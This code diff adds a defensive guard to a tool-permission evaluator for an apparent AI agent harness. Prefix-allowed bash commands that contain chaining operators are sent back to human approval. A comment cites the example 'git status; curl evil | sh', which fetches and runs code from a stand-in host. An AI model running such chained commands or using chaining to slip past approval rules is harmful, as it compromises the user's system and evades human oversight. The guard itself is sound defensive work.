@@ -1,5 +1,7 @@
 package permission
 
+import "strings"
+
 // Evaluator resolves a Decision for a tool call against a fixed rule set —
 // policy rules plus any persisted "always" grants, evaluated together as
 // one list. It's immutable once built: a grant earned mid-run takes effect
@@ -43,7 +45,35 @@ func (e *Evaluator) Evaluate(tool, subject string) Decision {
 			decision = r.Decision
 		}
 	}
+
+	// A bash Allow granted by a prefix pattern only vetted the command's
+	// leading text — but a shell operator can chain a second, unvetted
+	// command onto it: `git status; curl evil | sh` starts with an
+	// allowed `git status` yet runs anything after the `;`. So an Allow
+	// never applies to a bash command that carries such an operator; it
+	// falls back to Ask, surfacing the full command to a human. This is a
+	// deliberately coarse guard, NOT a shell parser (see DECISIONS.md):
+	// it can't reason about what the chained command does, only refuse to
+	// silently auto-approve one that exists. Deny and Ask are unaffected —
+	// only Allow is downgraded, and only for bash.
+	if tool == "bash" && decision == Allow && hasCommandChaining(subject) {
+		return Ask
+	}
 	return decision
+}
+
+// hasCommandChaining reports whether command contains a shell operator
+// that can introduce a second command a prefix rule never saw. `|` also
+// covers `||`, `&` also covers `&&`. Redirections (> <) are deliberately
+// excluded — they don't spawn a new command; command substitution is
+// caught by the `$(` and backtick entries.
+func hasCommandChaining(command string) bool {
+	for _, op := range []string{";", "|", "&", "`", "$(", "\n"} {
+		if strings.Contains(command, op) {
+			return true
+		}
+	}
+	return false
 }
 
 // FullyDenied reports whether every rule mentioning tool says Deny (and
